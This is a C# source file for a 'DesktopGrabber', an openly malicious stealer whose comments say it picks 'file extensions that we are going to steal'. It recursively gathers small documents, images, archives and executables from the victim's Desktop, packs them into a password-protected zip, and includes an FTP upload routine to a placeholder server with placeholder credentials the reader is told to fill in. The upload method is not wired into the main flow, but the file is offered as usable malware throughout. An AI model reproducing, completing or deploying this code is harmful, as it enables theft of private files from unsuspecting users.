using Ionic.Zip;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Net;

namespace DesktopGrabber
{
    public class Program
    {
        public static void Main()
        {
            new DesktopGrabber
            {
                Extensions = new List<string> { ".jpeg", ".jpg", ".txt", ".doc", ".docx", ".zip", ".exe", ".rar", ".doc", ".docx", ".mp4", }, // file extensions that we are going to steal, you can add more if you want to
                SizeLimit = 50 * 1000,
                ZipName = "files.zip",
                ZipPassword = "spuqe"
            }.Search();
        }
    }

    public class DesktopGrabber
    {

        public string ZipName { get; set; }
        public string ZipPassword { get; set; }
        public int SizeLimit { get; set; }
        public List<string> Extensions { get; set; }

        public bool Search()
        {
            try
            {
                List<string> files = new List<string>();

                foreach (string file in Directory.GetFiles(Environment.GetFolderPath(0), "*.*", SearchOption.AllDirectories))
                {
                    if (new FileInfo(file).Length <= SizeLimit && Extensions.Contains(Path.GetExtension(file).ToLower()))
                    {
                        files.Add(file);
                    }
                }
                if (files.Count == 0) return false;
                return Save(files);
            }
            catch { return false; }
        }

        private bool Save(List<string> files)
        {
            try
            {
                if (File.Exists(ZipName)) File.Delete(ZipName);
                Thread.Sleep(500);
                using (ZipFile zip = new ZipFile())
                {
                    zip.Password = ZipPassword;
                    foreach (string file in files)
                    {
                        zip.AddFile(file);
                    }
                    zip.Save(ZipName);
                }
                return true;
            }
            catch { return false; }
        }

        private bool Send()
        {
            WebClient client = new WebClient();
            client.Credentials = new NetworkCredential("root", "1234"); // add your credientals here!
            client.UploadFile(
                "ftp://127.0.0.1/grabber/files.zip", @"C:\desktop\files.zip"); // we expect the user opened it in his desktop..
            return true;
        }
    }
}
